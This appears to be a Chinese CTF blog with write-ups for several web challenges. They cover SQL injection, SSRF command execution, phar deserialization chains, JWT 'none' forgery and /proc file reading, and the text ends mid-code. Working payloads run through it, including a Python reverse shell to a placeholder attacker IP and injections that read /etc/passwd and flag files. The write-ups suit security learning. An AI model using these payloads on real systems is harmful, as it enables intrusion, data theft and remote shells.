[RCTF2015]EasySQL\n\n进入页面发现有一个登录一个注册，怀疑是二次注入，尝试在用户名中加入单双引号测试，注册成功但是登录失败，看看wp，使用反斜杠进行测试，在修改密码处测试成功，报错回显\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-06 21.58.42.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [HITCON 2017]SSRFme\n\n```PHP\n<?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\n两眼一蒙，直接[wp](https://blog.csdn.net/qq_49422880/article/details/121430262)，是新知识耶\n\n> 题目的意思是先以MD5(orange .ip)生成一个hash,放在sandbox之下，然后使用GET命令进行访问，那里就可以使用perl 进行命令执行，执行的前提是 前面必须要创建一个和这个命令一样的文件。然后呢就是将命令执行的结果放到我们传进去的文件里面。\n\n先看看根目录下有什么\n\n```\n?url=/&filename=aaa\n```\n\n看到了readflag文件，应该是要在根目录执行这个文件拿到flag了\n\n> 主要的知识点：perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠|）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。\n\n看payload\n\n```\npayload1:\n/?url=file:bash -c /readflag|&filename=bash -c /readflag|\n这一步是先将bash -c /readflag|写入名为bash -c /readflag|的文件里\npayload2:\n/?url=file:bash -c /readflag|&filename=aaa\n这一步是要执行上一步中写入的命令并把结果放入aaa文件中\npayload3:\n/sandbox/230317844a87b41e353b096d0d6a5145/aaa\n```\n\n## [CISCN2019 华北赛区 Day1 Web1]Dropbox\n\n注册->登录->上传文件->尝试下载->发现任意文件读取漏洞，查看源码\n\n```php\n//index.php\n<?php\ninclude \"class.php\";\n$a = new FileList($_SESSION['sandbox']);\n$a->Name();\n$a->Size();\n?>\n//download.php\n<?php\nsession_start();\nif (!isset($_SESSION['login'])) {\n    header(\"Location: login.php\");\n    die();\n}\n\nif (!isset($_POST['filename'])) {\n    die();\n}\n\ninclude \"class.php\";\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\nchdir($_SESSION['sandbox']);\n$file = new File();\n$filename = (string) $_POST['filename'];\nif (strlen($filename) < 40 && $file->open($filename) && stristr($filename, \"flag\") === false) {\n    Header(\"Content-type: application/octet-stream\");\n    Header(\"Content-Disposition: attachment; filename=\" . basename($filename));\n    echo $file->close();\n} else {\n    echo \"File not exist\";\n}\n?>\n\n//class.php\n<?php\nerror_reporting(0);\n$dbaddr = \"127.0.0.1\";\n$dbuser = \"root\";\n$dbpass = \"root\";\n$dbname = \"dropbox\";\n$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);\n\nclass User {\n    public $db;\n\n    public function __construct() {\n        global $db;\n        $this->db = $db;\n    }\n\n    public function user_exist($username) {\n        $stmt = $this->db->prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->store_result();\n        $count = $stmt->num_rows;\n        if ($count === 0) {\n            return false;\n        }\n        return true;\n    }\n\n    public function add_user($username, $password) {\n        if ($this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\");\n        $stmt->bind_param(\"ss\", $username, $password);\n        $stmt->execute();\n        return true;\n    }\n\n    public function verify_user($username, $password) {\n        if (!$this->user_exist($username)) {\n            return false;\n        }\n        $password = sha1($password . \"SiAchGHmFx\");\n        $stmt = $this->db->prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\");\n        $stmt->bind_param(\"s\", $username);\n        $stmt->execute();\n        $stmt->bind_result($expect);\n        $stmt->fetch();\n        if (isset($expect) && $expect === $password) {\n            return true;\n        }\n        return false;\n    }\n\n    public function __destruct() {\n        $this->db->close();\n    }\n}\n\nclass FileList {\n    private $files;\n    private $results;\n    private $funcs;\n\n    public function __construct($path) {\n        $this->files = array();\n        $this->results = array();\n        $this->funcs = array();\n        $filenames = scandir($path);\n\n        $key = array_search(\".\", $filenames);\n        unset($filenames[$key]);\n        $key = array_search(\"..\", $filenames);\n        unset($filenames[$key]);\n\n        foreach ($filenames as $filename) {\n            $file = new File();\n            $file->open($path . $filename);\n            array_push($this->files, $file);\n            $this->results[$file->name()] = array();\n        }\n    }\n\n    public function __call($func, $args) {\n        array_push($this->funcs, $func);//将一个func放入funcs\n        foreach ($this->files as $file) {//files为一个数组，存放new出的对象并进行遍历\n            $this->results[$file->name()][$func] = $file->$func();\n          \t//results是一个二维数组，[文件名][方法]=方法执行结果\n        }\n    }\n\n    public function __destruct() {\n        $table = '<div id=\"container\" class=\"container\"><div class=\"table-responsive\"><table id=\"table\" class=\"table table-bordered table-hover sm-font\">';\n        $table .= '<thead><tr>';\n        foreach ($this->funcs as $func) {\n            $table .= '<th scope=\"col\" class=\"text-center\">' . htmlentities($func) . '</th>';\n        }\n        $table .= '<th scope=\"col\" class=\"text-center\">Opt</th>';\n        $table .= '</thead><tbody>';\n        foreach ($this->results as $filename => $result) {\n            $table .= '<tr>';\n            foreach ($result as $func => $value) {\n                $table .= '<td class=\"text-center\">' . htmlentities($value) . '</td>';\n            }\n            $table .= '<td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"><a href=\"#\" class=\"download\">下载</a> / <a href=\"#\" class=\"delete\">删除</a></td>';\n            $table .= '</tr>';\n        }\n        echo $table;\n    }\n}\n\nclass File {\n    public $filename;\n\n    public function open($filename) {\n        $this->filename = $filename;\n        if (file_exists($filename) && !is_dir($filename)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public function name() {\n        return basename($this->filename);\n    }\n\n    public function size() {\n        $size = filesize($this->filename);\n        $units = array(' B', ' KB', ' MB', ' GB', ' TB');\n        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;\n        return round($size, 2).$units[$i];\n    }\n\n    public function detele() {\n        unlink($this->filename);\n    }\n\n    public function close() {\n        return file_get_contents($this->filename);\n    }\n}\n?>\n\n```\n\n应该是反序列化了，提示了phar协议，正好学习一下\n\n#### phar简介\n\nphar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程序分布在一个文件中并从该文件中运行的方法。可以将phar文件类比为一个压缩文件\n\n```\nphar文件结构\n\n1. a stub\n可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。\n\n2. a manifest describing the contents\nphar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n\n3. the file contents\n被压缩文件的内容。\n\n4. [optional] a signature for verifying Phar integrity (phar file format only)\n签名，放在文件末尾\n```\n\n先找反序列化链子吧\n\n> 会发现在File类中有一个close()函数，这里还直接调用file_get_comtents()函数,那么不多说这里绝对是链子的结尾。但是如果只用这两个类是不够的，因为不能直接打印出来。所以得继续下一个类FileList继续使用，正好里面也有__call函数。func是调用的方法名，args是方法的参数\n>  \n> 那么我们就将$this->db复制为FileList类这样我们就可以直接使用该类中得方法。\n\n```PHP\n//exp.php\n<?php\n\nclass User{\n    public $db;\n    public function __construct() \n    {\n        $this->db = new FileList();\n    }\n}\n\nclass File{\n    public $filename;\n}\n\nclass FileList {\n    private $files;\n    public function __construct() \n    {\n        $file = new File();\n        $file->filename = '/flag.txt';\n        $this->files = array($file);\n    }\n\n}\n\n$User = new User();\n$phar = new Phar(\"./rabbit.phar\"); //.phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($User); //触发的头是User类，所以传入User对象\n$phar->addFromString(\"test.txt\", \"test\"); //生成签名\n$phar->stopBuffering();\n?>\n\n```\n\n在delete页面传入phar://文件名即可\n\n## [CISCN2019 华北赛区 Day1 Web5]CyberPunk\n\n看源码得到提示`<!--?file=?-->`伪协议读代码\n\n```php\n//confirm.php\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"已提交订单\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n//change.php\n<?php\nrequire_once \"config.php\";\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单修改成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n```\n\n关键在于confirm中没有对传入的address进行过滤，而在change中又对查询出的旧address进行了使用，所以我们在更改地址的时候就会触发我们在confirm中提交的payload\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select database()),0x7e),1)#\n1' where phone=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\n```\n\n查完库和表发现好像不是在数据库内，load_file看看文件\n\n```\n1' where phone=updatexml(1,concat(0x7e,(select load_file('/flag.txt')),0x7e),1)#\n```\n\n拿到flag\n\n## [HFCTF2020]EasyLogin\n\n注册登录后点击`GET FLAG`显示权限不足，查看返回内容发现jwt\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 21.14.12.png)\n\n下一步不知道咋走了，看wp是要分析源码\n\n```javascript\n//app.js\nfunction login() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    const token = sessionStorage.getItem(\"token\");\n    $.post(\"/api/login\", {username, password, authorization:token})\n        .done(function(data) {\n            const {status} = data;\n            if(status) {\n                document.location = \"/home\";\n            }\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction register() {\n    const username = $(\"#username\").val();\n    const password = $(\"#password\").val();\n    $.post(\"/api/register\", {username, password})\n        .done(function(data) {\n            const { token } = data;\n            sessionStorage.setItem('token', token);\n            document.location = \"/login\";\n        })\n        .fail(function(xhr, textStatus, errorThrown) {\n            alert(xhr.responseJSON.message);\n        });\n}\n\nfunction logout() {\n    $.get('/api/logout').done(function(data) {\n        const {status} = data;\n        if(status) {\n            document.location = '/login';\n        }\n    });\n}\n\nfunction getflag() {\n    $.get('/api/flag').done(function(data) {\n        const {flag} = data;\n        $(\"#username\").val(flag);\n    }).fail(function(xhr, textStatus, errorThrown) {\n        alert(xhr.responseJSON.message);\n    });\n}\n\n```\n\n这里贴一张js代码结构图\n\n![](https://img-blog.csdnimg.cn/7b8b17a37cf94567bbc21edc080ab07b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VjYzM=,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n看看controllers中的app.js\n\n```javascript\n//controllers/app.js\nconst crypto = require('crypto');\nconst fs = require('fs')\nconst jwt = require('jsonwebtoken')\n\nconst APIError = require('../rest').APIError;\n\nmodule.exports = {\n    'POST /api/register': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || username === 'admin'){\n            throw new APIError('register error', 'wrong username');\n        }\n\n        if(global.secrets.length > 100000) {\n            global.secrets = [];\n        }\n\n        const secret = crypto.randomBytes(18).toString('hex');\n        const secretid = global.secrets.length;\n        global.secrets.push(secret)\n\n        const token = jwt.sign({secretid, username, password}, secret, {algorithm: 'HS256'});\n\n        ctx.rest({\n            token: token\n        });\n\n        await next();\n    },\n\n    'POST /api/login': async (ctx, next) => {\n        const {username, password} = ctx.request.body;\n\n        if(!username || !password) {\n            throw new APIError('login error', 'username or password is necessary');\n        }\n\n        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;\n\n        const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;\n\n        console.log(sid)\n\n        if(sid === undefined || sid === null || !(sid < global.secrets.length && sid >= 0)) {\n            throw new APIError('login error', 'no such secret id');\n        }\n\n        const secret = global.secrets[sid];\n\n        const user = jwt.verify(token, secret, {algorithm: 'HS256'});\n\n        const status = username === user.username && password === user.password;\n\n        if(status) {\n            ctx.session.username = username;\n        }\n\n        ctx.rest({\n            status\n        });\n\n        await next();\n    },\n\n    'GET /api/flag': async (ctx, next) => {\n        if(ctx.session.username !== 'admin'){\n            throw new APIError('permission error', 'permission denied');\n        }\n\n        const flag = fs.readFileSync('/flag').toString();\n        ctx.rest({\n            flag\n        });\n\n        await next();\n    },\n\n    'GET /api/logout': async (ctx, next) => {\n        ctx.session.username = null;\n        ctx.rest({\n            status: true\n        })\n        await next();\n    }\n};\n```\n\n可以看到加密算法是HS256，尝试将其更改为None直接传入\n\n```python\nimport jwt\ntoken = jwt.encode(\n{\n  \"secretid\": [],\n  \"username\": \"admin\",\n  \"password\": \"aaaaa\",\n  \"iat\": 1649380156\n},\nalgorithm=\"none\",key=\"\").encode(encoding='utf-8')\n\nprint(token)\n```\n\n登录成功！\n\n访问/api/flag拿到flag\n\n## [b01lers2020]Welcome to Earth\n\n阴间题！！！！！！！！！！！\n\n进去就疯狂跳转，总之就是不断查看源码不要跳转到die，最终跳转到fight查看js\n\n```javascript\n// Run to scramble original flag\n//console.log(scramble(flag, action));\nfunction scramble(flag, key) {\n  for (var i = 0; i < key.length; i++) {\n    let n = key.charCodeAt(i) % flag.length;\n    let temp = flag[i];\n    flag[i] = flag[n];\n    flag[n] = temp;\n  }\n  return flag;\n}\n\nfunction check_action() {\n  var action = document.getElementById(\"action\").value;\n  var flag = [\"{hey\", \"_boy\", \"aaaa\", \"s_im\", \"ck!}\", \"_baa\", \"aaaa\", \"pctf\"];\n\n  // TODO: unscramble function\n}\n```\n\n按照人间语法拼出flag\n\n```\npctf{hey_boys_im_baaaaaaaaaack!}\n```\n\n## [WUSTCTF2020]CV Maker\n\n看到这种模版化的界面，尝试扫目录看看是不是代码审计，结果没有，乖乖注册登录，发现可以上传头像，空文件直接上传发现警告\n\n```\nWarning: exif_imagetype(): Filename cannot be empty in /var/www/html/profile.php on line 76\n```\n\nemmmmmmm，使用exif_imagetype可使用幻数头绕过，上传木马\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08 22.05.39.png)\n\n访问拿flag即可\n\n## [GYCTF2020]Ezsqli\n\n布尔注入喵喵，脚本懒得贴了喵喵\n\n```\ndatabase：give_grandpa_pa_pa_pa\n```\n\ninformation_schema被ban了，mysql.innodb_table_stats也被ban了，新新知识居然还有个能用的\n\n```mysql\nselect group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()\ntable:f1ag_1s_h3r3_hhhhh,users233333333333333\n1^((select ('~','~'))>(select * from f1ag_1s_h3r3_hhhhh))\n```\n\n最后就是无列名注入啦\n\n```python\nimport requests\nflagname=\"flag-{1234567890bcdefg}\"\nname=\",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890\"\nurl=\"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php\"\nflag=\"\"\nfor i in range(1,100):\n    for j in range(33,128):\n        tmp=flag+chr(j)\n        data={'id':f\"0^((select 1,'{tmp}')>(select * from f1ag_1s_h3r3_hhhhh))\"}\n        tes=requests.post(url=url,data=data).text\n        if \"Nu1L\" in tes:\n            print(chr(j-1),end=\"\")\n            flag=flag+chr(j-1)\n            break\n```\n\n## [网鼎杯 2018]Comment\n\n先爆破登录，zhangwei666\n\n.git文件泄露\n\nGitHack扫出后发现代码内容不全，使用Git恢复旧仓库\n\n```php\n//write_do.php\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n很明显在comment处存在二次注入，又因为此处insert是带有换行的，所以不能直接使用#来进行注释，使用/**/进行多行注释，构造payload\n\n```mysql\ncategory:0',content=database(),/*\n留言comment处:*/#\n最终构造出的语句\ninsert into comment\nset category = '0',content=database(),/*',\ncontent = '*/#',\nbo_id = '$bo_id'\";\n\ninsert into comment set category = '0',content=database(),bo_id = '$bo_id'\";\n```\n\n在回显留言即可看到结果\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 08.47.30.png)\n\n按照这个方法查完全库也没有结果，尝试loadfile吧，不知道读啥，捞一下wp的结果\n\n> load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。\n> 一般用法步骤：\n> 读/etc/init.d下的东西，这里有配置文件路径\n> ?id=1' union select 1,2,load_file('/etc/init.d/httpd')\n> 得到web安装路径\n> ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')\n> 读取密码文件\n> ?id=1' union select 1,2,load_file('var/www/html/xxx.com/php/conn.inc.php')\n\n先看/etc/passwd\n\n```\nwww:x:500:500:www:/home/www:/bin/bash\n```\n\n得到跑web服务的用户\n\n> 每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。\n\n访问拿到用过的命令\n\n```\ncd /tmp/ \nunzip html.zip \nrm -f html.zip \ncp -r html /var/www/ \ncd /var/www/html/ \nrm -f .DS_Store \nservice apache2 start\n```\n\n访问/tmp/html/.DS_Store拿到文件夹内容，太长内容可能包含sql语句，使用16进制编码，发现文件`flag_8946e1ff1ee3e40f.php`，读取拿flag即可，记得读/var/www/html下的文件，tmp中的不正确\n\n## [watevrCTF-2019]Cookie Store\n\ncookiebase64解一下然后改了价格再传回去\n\n## [网鼎杯 2020 白虎组]PicDown\n\nPicDown，下载照片，尝试访问/etc/passwd下载成功，看来可以找找源码，没啥文件包含思路，看wp，是linux的进程文件\n\n> 可以通过/proc/pid/ 来 获 取 指 定 进 程 的 信 息 ， 例 如 内 存 映 射 、 CPU绑 定 信 息 等 等 。 如 果 某 个 进 程 想 要 获 取 本 进 程 的 系 统 信 息 ， 就 可 以 通 过 进 程 的pid来 访 问 /proc/ pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。\n\n其中的重要文件\n\n```\ncmdline\ncmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：\n\ncwd\ncwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录\n\nenviron\nenviron文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息\n\nfd\nfd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。\n```\n\n利用\n\n```\n1.获取当前启动进程的完成命令：\ncat /proc/self/cmdline\n\n2.获取目标当前进程的运行目录与目录里的文件：\nls -al /proc/self/cwd\nls /proc/self/cwd\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n3.获得当前进程的可执行文件的完整路径：\nls -al /proc/self/exe\n\n4.获取当前环境变量\ncat /proc/self/environ\n\n5.获取当前进程打开的文件内容\ncat /proc/self/fd/{id}\n也可以是：\ncat /proc/*/fd/*    --*可以代替任意数字和字母\n```\n\n本题中我们可以访问一下这几个位置\n\n```\ncmdline\npython2 app.py\n\nenviron\nMAIL=/var/mail/app\nUSER=app\nHOME=/home/app\nLOGNAME=app\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nSHELL=/bin/sh\nPWD=/app\n```\n\n在运行位置拿到源码\n\n```python\n#/proc/self/cwd/app.py\nfrom flask import Flask, Response\nfrom flask import render_template\nfrom flask import request\nimport os\nimport urllib\n\napp = Flask(__name__)\n\nSECRET_FILE = \"/tmp/secret.txt\"\nf = open(SECRET_FILE)\nSECRET_KEY = f.read().strip()\nos.remove(SECRET_FILE)\n\n\n@app.route('/')\ndef index():\n    return render_template('search.html')\n\n\n@app.route('/page')\ndef page():\n    url = request.args.get(\"url\")\n    try:\n        if not url.lower().startswith(\"file\"):\n            res = urllib.urlopen(url)\n            value = res.read()\n            response = Response(value, mimetype='application/octet-stream')\n            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'\n            return response\n        else:\n            value = \"HACK ERROR!\"\n    except:\n        value = \"SOMETHING WRONG!\"\n    return render_template('search.html', res=value)\n\n\n@app.route('/no_one_know_the_manager')\ndef manager():\n    key = request.args.get(\"key\")\n    print(SECRET_KEY)\n    if key == SECRET_KEY:\n        shell = request.args.get(\"shell\")\n        os.system(shell)\n        res = \"ok\"\n    else:\n        res = \"Wrong Key!\"\n\n    return res\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n\n```\n\n可以看到代码中打开了`/tmp/secret.txt`并且将其中的内容作为SECRET_KEY，所以我们访问到这个文件就行了，尝试直接读取发现失败，那么我们利用proc文件中的fd文件夹，id从1开始尝试，最终可以拿到该文件\n\n```\nurl=/proc/self/fd/3\np3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=\n```\n\n尝试传参，成功，但是命令执行成功后却没有回显，下一步就是反弹shell或者写文件\n\n反弹shell\n\n```\npayload:\nkey=p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=&shell=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"服务器IP喵喵\",监听端口喵喵));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n~~骚操作直接访问/flag下载文件~~\n\n## [SWPUCTF 2018]SimplePHP\n\n查看文件处可以查看页面源码\n\n```php\n//file.php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} \n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\n```php\n//class.php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str=new Show;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str['str']=new Test;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params['source']=\"/var/www/html/f1ag.php\";\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n```php\n//function.php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\n反序列化找链子很明显了\n\n```\nC1e4r::__destruct->Show::__toString->Test::__get->Test::get->Test::file_get\n```\n\n构造反序列化\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n}\n\n$a = new C1e4r();\n$b = new Show();\n$a->str = $b;\n$c = new Test();\n$c->params['source'] = \"/var/www/html/f1ag.php\";//目标文件\n$b->str['str'] = $c;  //触发__get;\n\n\n$phar = new Phar(\"exp.phar\"); //生成phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a); //触发类是C1e4r类\n$phar->addFromString(\"text.txt\", 